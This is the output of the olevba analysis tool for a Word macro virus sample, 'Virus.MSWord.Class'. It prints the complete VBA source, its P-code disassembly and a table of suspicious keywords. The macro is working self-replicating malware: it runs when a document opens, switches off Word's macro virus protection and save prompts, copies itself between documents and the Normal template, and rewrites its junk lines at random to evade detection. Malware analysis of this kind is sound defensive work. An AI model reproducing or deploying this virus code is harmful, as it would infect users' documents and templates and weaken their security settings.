olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.cl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.cl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
C = LnGGi + AjRPz + JhRIe + TyUIo + QyNKt + NlFGh + SnVUv + PeFLx + VlAMx + R
On Error Resume Next
K = BtIGf + VrGDw + OqJPs + NvEMy + T
Application.EnableCancelKey = 0
H = RrGUm + NqCMk + UhALf + JlLLp + I
Options.VirusProtection = 0
Q = BuVBr + IpDKu + NoDUl + LrCRp + N
ME84 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
E = AvBCs + CzLOo + SyEOq + HwPUo + BjIKp + EsCMw + UxJGg + QtOFy + AsRGu + KuHAp + T
Options.SaveNormalPrompt = 0
R = QfHLy + NqVCf + NsDKv + VxAHn + UoISh + OkVHp + JkDJo + L
Options.ConfirmConversions = 0
C = LuNKl + TrGGw + LvMHg + KvPQm + RwREe + ByRIp + C
GJ13 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
J = BkLMv + KjQIg + QyNPz + I
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
E = ViPJj + GsJUx + OsCEy + JeLKe + I
Set NQ17 = ActiveDocument.VBProject.VBComponents.Item(1)
O = GoDLe + MfOJk + BjPKw + EsRBo + QiHVi + T
UF19 = True
P = JxURk + IzDDo + IxGOh + KvTIs + QvJFg + NrISn + UoHTu + FwHAj + StPIi + QqBJs + G
End If
E = DmVFf + CeNNg + MuSBq + QuIIo + FnEBg + ClTFf + SqKQh + IvHJw + NxEPo + V
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
M = AqGQg + SwCAw + IvVTn + QwFAh + RiHJn + RnEEr + H
Set NQ17 = NormalTemplate.VBProject.VBComponents.Item(1)
O = JnBMv + VfVSq + ReFDk + AsPCx + GrMGt + RtIIh + JkOIf + L
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
L = MjKTt + OgGIz + GeQMm + FoRSx + J
ME84 = ME84 + 2
E = JkKIf + VmLNy + G
PH37 = True
L = DqMMi + ArBGm + N
End If
U = UjMJj + DyFQf + HkRAi + KvNTf + OzOVz + B
If PH37 <> True And UF19 <> True Then GoTo OU29
P = MiABn + GqLQq + HyIMj + MlRJi + P
If PH37 = True Then NQ17.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ME84 - 1))
C = EiBFf + SvEFf + FuPOi + QtSPg + EsMHv + MmDBm + SlJEp + VjIKn + OzOTs + J
If UF19 = True Then NQ17.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GJ13 - 1))
G = HqQJk + LwGBe + GmGSs + RwGBp + JmAHx + HjNVh + MmETs + NmQPk + QuMLn + J
With NQ17.CodeModule
S = VoMKz + IwODv + IxNPq + JsPEz + TzKQj + E
For x = 2 To (NQ17.CodeModule.CountOfLines - 1) Step 2
A = ThJKs + FiLLm + BkFBt + VsOHr + HvEJm + FkMNy + D
For y = 1 To (Int(Rnd * 10) + 2)
S = InGSg + LrAFw + OeGFg + CnNNk + C
CI33 = CI33 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "
I = SuOIh + JhEQg + EeVTo + OpDOm + SrBLy + J
Next y
U = VzONo + AkGVt + IsHFm + PuMMe + F
.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & CI33 & (Chr(65 + Int(Rnd * 22)))
D = QrNKp + CeDMl + ClQRq + BpMBq + CwGVm + GqKBp + JfGDo + HoIFy + OrMTq + NrBCw + Q
CI33 = ""
M = DzPSo + ReLBm + HtPIr + EgDIm + Q
Next x
T = HzRUt + EfEJs + HeMLx + A
End With
Q = PuUKk + IuNMp + OjBDx + BnVEs + TpFSy + CeSSe + FlNVq + BgDFm + IoUMe + I
OU29:
T = MqBAs + JrNDq + DeGBi + PuRTe + FpUUo + TnJSk + TwROf + SiRKj + MwGKg + I
If GJ13 <> 0 And ME84 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
B = LeJRt + BgMSi + QfBSu + GyTVu + LsEEx + NnSBv + NpGSt + VrRRm + HnOMy + SyDGq + JhBTu + R
' ****** Tester was infected 2/26/01 10:27:08 AM
U = ClFSv + EoNNx + I
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.cl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6815 bytes
' Line #0:
' 	FuncDefn (Sub Document_Open())
' Line #1:
' 	Ld LnGGi 
' 	Ld AjRPz 
' 	Add 
' 	Ld JhRIe 
' 	Add 
' 	Ld TyUIo 
' 	Add 
' 	Ld QyNKt 
' 	Add 
' 	Ld NlFGh 
' 	Add 
' 	Ld SnVUv 
' 	Add 
' 	Ld PeFLx 
' 	Add 
' 	Ld VlAMx 
' 	Add 
' 	Ld R 
' 	Add 
' 	St C 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld BtIGf 
' 	Ld VrGDw 
' 	Add 
' 	Ld OqJPs 
' 	Add 
' 	Ld NvEMy 
' 	Add 
' 	Ld T 
' 	Add 
' 	St K 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	Ld RrGUm 
' 	Ld NqCMk 
' 	Add 
' 	Ld UhALf 
' 	Add 
' 	Ld JlLLp 
' 	Add 
' 	Ld I 
' 	Add 
' 	St H 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	Ld BuVBr 
' 	Ld IpDKu 
' 	Add 
' 	Ld NoDUl 
' 	Add 
' 	Ld LrCRp 
' 	Add 
' 	Ld N 
' 	Add 
' 	St Q 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ME84 
' Line #9:
' 	Ld AvBCs 
' 	Ld CzLOo 
' 	Add 
' 	Ld SyEOq 
' 	Add 
' 	Ld HwPUo 
' 	Add 
' 	Ld BjIKp 
' 	Add 
' 	Ld EsCMw 
' 	Add 
' 	Ld UxJGg 
' 	Add 
' 	Ld QtOFy 
' 	Add 
' 	Ld AsRGu 
' 	Add 
' 	Ld KuHAp 
' 	Add 
' 	Ld T 
' 	Add 
' 	St E 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	Ld QfHLy 
' 	Ld NqVCf 
' 	Add 
' 	Ld NsDKv 
' 	Add 
' 	Ld VxAHn 
' 	Add 
' 	Ld UoISh 
' 	Add 
' 	Ld OkVHp 
' 	Add 
' 	Ld JkDJo 
' 	Add 
' 	Ld L 
' 	Add 
' 	St R 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	Ld LuNKl 
' 	Ld TrGGw 
' 	Add 
' 	Ld LvMHg 
' 	Add 
' 	Ld KvPQm 
' 	Add 
' 	Ld RwREe 
' 	Add 
' 	Ld ByRIp 
' 	Add 
' 	Ld C 
' 	Add 
' 	St C 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St GJ13 
' Line #15:
' 	Ld BkLMv 
' 	Ld KjQIg 
' 	Add 
' 	Ld QyNPz 
' 	Add 
' 	Ld I 
' 	Add 
' 	St J 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld ViPJj 
' 	Ld GsJUx 
' 	Add 
' 	Ld OsCEy 
' 	Add 
' 	Ld JeLKe 
' 	Add 
' 	Ld I 
' 	Add 
' 	St E 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NQ17 
' Line #19:
' 	Ld GoDLe 
' 	Ld MfOJk 
' 	Add 
' 	Ld BjPKw 
' 	Add 
' 	Ld EsRBo 
' 	Add 
' 	Ld QiHVi 
' 	Add 
' 	Ld T 
' 	Add 
' 	St O 
' Line #20:
' 	LitVarSpecial (True)
' 	St UF19 
' Line #21:
' 	Ld JxURk 
' 	Ld IzDDo 
' 	Add 
' 	Ld IxGOh 
' 	Add 
' 	Ld KvTIs 
' 	Add 
' 	Ld QvJFg 
' 	Add 
' 	Ld NrISn 
' 	Add 
' 	Ld UoHTu 
' 	Add 
' 	Ld FwHAj 
' 	Add 
' 	Ld StPIi 
' 	Add 
' 	Ld QqBJs 
' 	Add 
' 	Ld G 
' 	Add 
' 	St P 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld DmVFf 
' 	Ld CeNNg 
' 	Add 
' 	Ld MuSBq 
' 	Add 
' 	Ld QuIIo 
' 	Add 
' 	Ld FnEBg 
' 	Add 
' 	Ld ClTFf 
' 	Add 
' 	Ld SqKQh 
' 	Add 
' 	Ld IvHJw 
' 	Add 
' 	Ld NxEPo 
' 	Add 
' 	Ld V 
' 	Add 
' 	St E 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld AqGQg 
' 	Ld SwCAw 
' 	Add 
' 	Ld IvVTn 
' 	Add 
' 	Ld QwFAh 
' 	Add 
' 	Ld RiHJn 
' 	Add 
' 	Ld RnEEr 
' 	Add 
' 	Ld H 
' 	Add 
' 	St M 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NQ17 
' Line #27:
' 	Ld JnBMv 
' 	Ld VfVSq 
' 	Add 
' 	Ld ReFDk 
' 	Add 
' 	Ld AsPCx 
' 	Add 
' 	Ld GrMGt 
' 	Add 
' 	Ld RtIIh 
' 	Add 
' 	Ld JkOIf 
' 	Add 
' 	Ld L 
' 	Add 
' 	St O 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0009 "' ****** "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000E " was infected "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #29:
' 	Ld MjKTt 
' 	Ld OgGIz 
' 	Add 
' 	Ld GeQMm 
' 	Add 
' 	Ld FoRSx 
' 	Add 
' 	Ld J 
' 	Add 
' 	St L 
' Line #30:
' 	Ld ME84 
' 	LitDI2 0x0002 
' 	Add 
' 	St ME84 
' Line #31:
' 	Ld JkKIf 
' 	Ld VmLNy 
' 	Add 
' 	Ld G 
' 	Add 
' 	St E 
' Line #32:
' 	LitVarSpecial (True)
' 	St PH37 
' Line #33:
' 	Ld DqMMi 
' 	Ld ArBGm 
' 	Add 
' 	Ld N 
' 	Add 
' 	St L 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld UjMJj 
' 	Ld DyFQf 
' 	Add 
' 	Ld HkRAi 
' 	Add 
' 	Ld KvNTf 
' 	Add 
' 	Ld OzOVz 
' 	Add 
' 	Ld B 
' 	Add 
' 	St U 
' Line #36:
' 	Ld PH37 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld UF19 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo OU29 
' 	EndIf 
' Line #37:
' 	Ld MiABn 
' 	Ld GqLQq 
' 	Add 
' 	Ld HyIMj 
' 	Add 
' 	Ld MlRJi 
' 	Add 
' 	Ld P 
' 	Add 
' 	St P 
' Line #38:
' 	Ld PH37 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld ME84 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld NQ17 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #39:
' 	Ld EiBFf 
' 	Ld SvEFf 
' 	Add 
' 	Ld FuPOi 
' 	Add 
' 	Ld QtSPg 
' 	Add 
' 	Ld EsMHv 
' 	Add 
' 	Ld MmDBm 
' 	Add 
' 	Ld SlJEp 
' 	Add 
' 	Ld VjIKn 
' 	Add 
' 	Ld OzOTs 
' 	Add 
' 	Ld J 
' 	Add 
' 	St C 
' Line #40:
' 	Ld UF19 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld GJ13 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld NQ17 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #41:
' 	Ld HqQJk 
' 	Ld LwGBe 
' 	Add 
' 	Ld GmGSs 
' 	Add 
' 	Ld RwGBp 
' 	Add 
' 	Ld JmAHx 
' 	Add 
' 	Ld HjNVh 
' 	Add 
' 	Ld MmETs 
' 	Add 
' 	Ld NmQPk 
' 	Add 
' 	Ld QuMLn 
' 	Add 
' 	Ld J 
' 	Add 
' 	St G 
' Line #42:
' 	StartWithExpr 
' 	Ld NQ17 
' 	MemLd CodeModule 
' 	With 
' Line #43:
' 	Ld VoMKz 
' 	Ld IwODv 
' 	Add 
' 	Ld IxNPq 
' 	Add 
' 	Ld JsPEz 
' 	Add 
' 	Ld TzKQj 
' 	Add 
' 	Ld E 
' 	Add 
' 	St S 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NQ17 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #45:
' 	Ld ThJKs 
' 	Ld FiLLm 
' 	Add 
' 	Ld BkFBt 
' 	Add 
' 	Ld VsOHr 
' 	Add 
' 	Ld HvEJm 
' 	Add 
' 	Ld FkMNy 
' 	Add 
' 	Ld D 
' 	Add 
' 	St A 
' Line #46:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	For 
' Line #47:
' 	Ld InGSg 
' 	Ld LrAFw 
' 	Add 
' 	Ld OeGFg 
' 	Add 
' 	Ld CnNNk 
' 	Add 
' 	Ld C 
' 	Add 
' 	St S 
' Line #48:
' 	Ld CI33 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	St CI33 
' Line #49:
' 	Ld SuOIh 
' 	Ld JhEQg 
' 	Add 
' 	Ld EeVTo 
' 	Add 
' 	Ld OpDOm 
' 	Add 
' 	Ld SrBLy 
' 	Add 
' 	Ld J 
' 	Add 
' 	St I 
' Line #50:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Ld VzONo 
' 	Ld AkGVt 
' 	Add 
' 	Ld IsHFm 
' 	Add 
' 	Ld PuMMe 
' 	Add 
' 	Ld False 
' 	Add 
' 	St U 
' Line #52:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld CI33 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' 	Ld QrNKp 
' 	Ld CeDMl 
' 	Add 
' 	Ld ClQRq 
' 	Add 
' 	Ld BpMBq 
' 	Add 
' 	Ld CwGVm 
' 	Add 
' 	Ld GqKBp 
' 	Add 
' 	Ld JfGDo 
' 	Add 
' 	Ld HoIFy 
' 	Add 
' 	Ld OrMTq 
' 	Add 
' 	Ld NrBCw 
' 	Add 
' 	Ld Q 
' 	Add 
' 	St D 
' Line #54:
' 	LitStr 0x0000 ""
' 	St CI33 
' Line #55:
' 	Ld DzPSo 
' 	Ld ReLBm 
' 	Add 
' 	Ld HtPIr 
' 	Add 
' 	Ld EgDIm 
' 	Add 
' 	Ld Q 
' 	Add 
' 	St M 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld HzRUt 
' 	Ld EfEJs 
' 	Add 
' 	Ld HeMLx 
' 	Add 
' 	Ld A 
' 	Add 
' 	St T 
' Line #58:
' 	EndWith 
' Line #59:
' 	Ld PuUKk 
' 	Ld IuNMp 
' 	Add 
' 	Ld OjBDx 
' 	Add 
' 	Ld BnVEs 
' 	Add 
' 	Ld TpFSy 
' 	Add 
' 	Ld CeSSe 
' 	Add 
' 	Ld FlNVq 
' 	Add 
' 	Ld BgDFm 
' 	Add 
' 	Ld IoUMe 
' 	Add 
' 	Ld I 
' 	Add 
' 	St Q 
' Line #60:
' 	Label OU29 
' Line #61:
' 	Ld MqBAs 
' 	Ld JrNDq 
' 	Add 
' 	Ld DeGBi 
' 	Add 
' 	Ld PuRTe 
' 	Add 
' 	Ld FpUUo 
' 	Add 
' 	Ld TnJSk 
' 	Add 
' 	Ld TwROf 
' 	Add 
' 	Ld SiRKj 
' 	Add 
' 	Ld MwGKg 
' 	Add 
' 	Ld I 
' 	Add 
' 	St T 
' Line #62:
' 	Ld GJ13 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ME84 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #63:
' 	Ld LeJRt 
' 	Ld BgMSi 
' 	Add 
' 	Ld QfBSu 
' 	Add 
' 	Ld GyTVu 
' 	Add 
' 	Ld LsEEx 
' 	Add 
' 	Ld NnSBv 
' 	Add 
' 	Ld NpGSt 
' 	Add 
' 	Ld VrRRm 
' 	Add 
' 	Ld HnOMy 
' 	Add 
' 	Ld SyDGq 
' 	Add 
' 	Ld JhBTu 
' 	Add 
' 	Ld R 
' 	Add 
' 	St B 
' Line #64:
' 	QuoteRem 0x0000 0x002F " ****** Tester was infected 2/26/01 10:27:08 AM"
' Line #65:
' 	Ld ClFSv 
' 	Ld EoNNx 
' 	Add 
' 	Ld I 
' 	Add 
' 	St U 
' Line #66:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

